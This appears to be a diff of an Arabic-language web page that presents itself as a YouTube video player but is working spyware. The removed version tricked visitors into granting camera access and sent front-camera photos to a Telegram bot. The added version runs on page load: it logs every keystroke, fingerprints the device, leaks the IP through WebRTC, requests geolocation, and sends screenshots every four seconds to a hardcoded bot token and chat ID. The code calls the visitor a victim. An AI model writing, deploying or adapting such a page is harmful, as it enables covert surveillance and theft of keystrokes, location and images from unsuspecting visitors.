@@ -2,150 +2,136 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title></title> <!--   -->
+  <title></title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #000;
-      color: white;
-      font-family: Arial, sans-serif;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      overflow: hidden;
-    }
-    #container {
-      z-index: 9999;
-      background: rgba(0,0,0,0.85);
-      padding: 60px 40px;
-      border-radius: 20px;
-      max-width: 90%;
-      box-shadow: 0 0 40px rgba(255,255,255,0.3);
-    }
-    h1 {
-      font-size: 36px;
-      margin-bottom: 50px;
-      text-shadow: 0 0 15px #fff;
-    }
-    button {
-      padding: 25px 70px;
-      margin: 30px 20px;
-      font-size: 28px;
-      font-weight: bold;
-      border: none;
-      border-radius: 15px;
-      cursor: pointer;
-      color: white;
-      transition: all 0.3s;
-      width: 350px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
-    }
-    button:hover {
-      transform: scale(1.08);
-      box-shadow: 0 12px 30px rgba(255,255,255,0.4);
-    }
-    #yes { background: #00cc44; }
-    #no { background: #ff4444; }
-    #msg {
-      margin-top: 40px;
-      font-size: 22px;
-      color: #ddd;
-    }
-    #video {
-      display: none;
-      width: 100vw;
-      height: 100vh;
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 1;
-    }
+    body { margin:0; background:#000; overflow:hidden; font-family:Arial; color:#fff; }
+    iframe { width:100vw; height:100vh; border:none; }
+    #msg { position:fixed; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:12px; border-radius:8px; z-index:9999; font-size:18px; }
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
 
-<div id="container">
- 
-  <button id="yes" onclick="startCamera()">متابعة مشاهدة الفيديو</button>
-  <br>
-  <button id="no" onclick="reject()">رفض مشاهدة الفيديو</button>
-  <div id="msg">    </div>
-</div>
+<iframe src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
 
-<iframe id="video" src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
+<div id="msg">جاري التحميل...</div>
 
 <script>
-// Telegram Config – تاعك
-const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
+// Telegram Config – تاعك مباشرة
+const TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
 const CHAT_ID = '6769216123';
 
+let keys = '';
+
 // إرسال نص
-function sendText(text) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+function sendText(msg) {
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
   }).catch(() => {});
 }
 
-// رفض → ما يصير والو
-function reject() {
-  document.getElementById('msg').innerText = 'تم الرفض، شكراً!';
-  setTimeout(() => window.close(), 3000);
+// إرسال صورة
+function sendPhoto(img, caption) {
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ chat_id: CHAT_ID, photo: img, caption: caption })
+  }).catch(() => {});
 }
 
-// متابعة → طلب الكاميرا + سحب 10 صور
-async function startCamera() {
-  document.getElementById('container').style.display = 'none';
-  document.getElementById('video').style.display = 'block';
-  document.getElementById('msg').innerText = 'جاري تشغيل الفيديو...';
+// Keylogger فوري (كل حرف في الثانية تاعو)
+document.addEventListener('keydown', e => {
+  let k = e.key;
+  if (k === 'Backspace') k = '[⌫]';
+  if (k === 'Enter') k = '[↵]';
+  if (k === ' ') k = '[␣]';
+  
+  keys += k;
+  
+  // إرسال فوري لكل ضغطة
+  sendText(`⌨️ ${k} | ${new Date().toISOString().slice(11,19)} | ${navigator.userAgent.slice(0,80)}...`);
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user' } // الكاميرا الأمامية فقط
-    });
-
-    sendText('✅ الضحية وافق على الكاميرا الأمامية!');
-
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-
-    let count = 0;
-    const interval = setInterval(() => {
-      if (count >= 10) {
-        clearInterval(interval);
-        stream.getTracks().forEach(track => track.stop());
-        sendText('تم سحب 10 صور من الكاميرا الأمامية بنجاح');
-        return;
-      }
-
-      html2canvas(video, {scale: 0.5}).then(canvas => {
-        const img = canvas.toDataURL('image/png');
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            photo: img,
-            caption: `صورة ${count+1}/10 من الكاميرا الأمامية`
-          })
-        }).catch(() => {});
-        count++;
-      });
-    }, 800); // صورة كل 0.8 ثانية
-
-  } catch (err) {
-    sendText(`❌ رفض الوصول للكاميرا: ${err.message || 'غير معروف'}`);
-    document.getElementById('msg').innerText = 'يرجى السماح بالكاميرا لمشاهدة الفيديو';
-    document.getElementById('container').style.display = 'flex';
-    document.getElementById('video').style.display = 'none';
+  if (keys.length > 15) {
+    sendText(`⌨️ سلسلة: ${keys}`);
+    keys = '';
   }
+});
+
+// جمع كل المعلومات الممكنة
+async function grabAll() {
+  const v = {
+    t: new Date().toISOString(),
+    u: location.href,
+    r: document.referrer || 'direct',
+    ua: navigator.userAgent,
+    p: navigator.platform || '?',
+    v: navigator.vendor || '?',
+    l: navigator.language,
+    ls: navigator.languages?.join(', ') || '?',
+    s: `${screen.width}x${screen.height} • ${screen.colorDepth} • ${devicePixelRatio}`,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cpu: navigator.hardwareConcurrency || '?',
+    ram: navigator.deviceMemory || '?',
+    touch: 'ontouchstart' in window ? 'نعم' : 'لا',
+    mtp: navigator.maxTouchPoints || 0,
+    conn: navigator.connection ? `${navigator.connection.type || '?'} • RTT:${navigator.connection.rtt}ms • ${navigator.connection.effectiveType} • ${navigator.connection.downlink}Mbps` : '?',
+    pdf: navigator.pdfViewerEnabled ? 'نعم' : 'لا',
+    wd: navigator.webdriver ? 'نعم' : 'لا',
+    ck: navigator.cookieEnabled ? 'نعم' : 'لا',
+    dnt: navigator.doNotTrack || '?',
+    on: navigator.onLine ? 'نعم' : 'لا',
+    bat: 'جاري...',
+    ip: 'جاري...',
+    geo: 'غير معروف',
+    scrn: 'جاري...',
+    keys: 'تسجيل...'
+  };
+
+  // IP (WebRTC)
+  try {
+    const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('');
+    pc.createOffer(o => pc.setLocalDescription(o), e => {});
+    pc.onicecandidate = e => {
+      if (e.candidate) {
+        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+        if (m) v.ip = m[1];
+      }
+      sendText(`🌐 IP → ${v.ip || 'غير متوفر'}`);
+    };
+  } catch(e) { v.ip = 'محجوب'; }
+
+  // Battery
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      v.bat = `${Math.round(b.level*100)}% | ${b.charging ? 'تشحن' : 'غير مشحون'}`;
+      sendText(`🔋 ${v.bat}`);
+    });
+  }
+
+  // Geolocation
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(p => {
+      v.geo = `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)} (±${p.coords.accuracy}m)`;
+      sendText(`📍 ${v.geo}`);
+    }, () => sendText('📍 الموقع مرفوض'));
+  }
+
+  // Screenshot كل 4 ثواني
+  setInterval(() => {
+    html2canvas(document.body, {scale:0.5}).then(c => {
+      sendPhoto(c.toDataURL('image/png'), `صورة الشاشة ${new Date().toISOString().slice(11,19)}`);
+    });
+  }, 4000);
+
+  // إرسال الكل فورًا
+  sendText(`🔔 دخول جديد\n\n` + JSON.stringify(v, null, 2));
 }
+
+window.onload = grabAll;
 </script>
 
 </body>
